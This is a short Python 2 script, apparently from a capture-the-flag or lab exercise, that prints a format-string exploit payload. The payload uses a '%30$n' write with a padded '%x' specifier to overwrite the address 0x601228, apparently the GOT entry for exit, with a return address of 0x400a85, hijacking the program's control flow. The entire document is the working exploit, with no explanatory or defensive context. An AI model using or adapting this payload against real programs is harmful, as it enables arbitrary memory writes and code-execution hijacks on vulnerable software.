import struct


exit_address = struct.pack('Q', 0x601228);
return_address = 0x400a85;

print "%" + str(return_address) + "x" + "%30$n" + "AA" + exit_address
print "dummy"
